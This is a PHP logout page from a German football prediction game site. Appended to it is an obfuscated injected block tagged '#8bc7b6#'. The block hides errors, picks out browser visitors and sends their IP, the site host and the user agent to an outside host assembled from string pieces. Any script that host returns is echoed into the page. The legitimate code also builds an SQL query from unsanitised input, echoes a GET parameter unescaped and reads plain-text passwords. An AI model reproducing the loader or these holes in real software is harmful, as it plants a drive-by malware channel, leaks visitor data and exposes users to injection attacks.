<?php
session_start();
$userId=$_GET["userId"];
include_once("../../connection/dbaccess-local.php5");
include_once("../util/dbschema.php5");
if(isset($_POST["Cancel"]))
{
	$target="./overview.php5?userId=$userId";
	header("Location:$target");
	exit;
}
else if(isset($_POST["logout"]))
{
	
}
else 
{
	echo "<html>";
	echo "<head>";
	echo "<link rel='stylesheet' type='text/css' href='../../style/style-EM2016.css' />";
	echo "<title> Werke's Tippspiel - Logout</title>";
	echo "</head>";
	echo "<br>";
	// echo "<font color=\"red\"><b>Hast du alle Tipps vollständig ausgefüllt und nichts vergessen?</b></font>";
	echo "<p class=\"info\">Hast du alle Tipps vollständig ausgefüllt und nichts vergessen?</p>";
	echo "<br>";
	echo "<br>";
	echo "Hm, nochmal ";
	echo "<a href='./showAllTipps.php5?userId=$userId&framepart=group' target='Daten'>Meine Gruppen-Tipps</a> und ";
	echo "<a href='./showAllTipps.php5?userId=$userId&framepart=rest' target='Daten'>Meine Endrunden-Tipps</a> kontrollieren?";
	echo "<br>";
	echo "<br>";
	echo "<a href='../util/login.php5' target='Daten' onclick='FrameAendern()'/><FONT SIZE=5><b>Logout</b></FONT>";
    echo "<br>";
}

function getPassword($userid){
	
	$table_users=dbschema::users;
	$result=mysql_query("SELECT * FROM $table_users WHERE userid = '$userid'");
	$array=mysql_fetch_array($result);
	$password=$array["password"];
	return $password;
}
?>
<?php
#8bc7b6#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/8bc7b6#
?>

<script type="text/javascript">
function FrameAendern () {
  parent.location.href = "../util/login.php5";
}
</script>
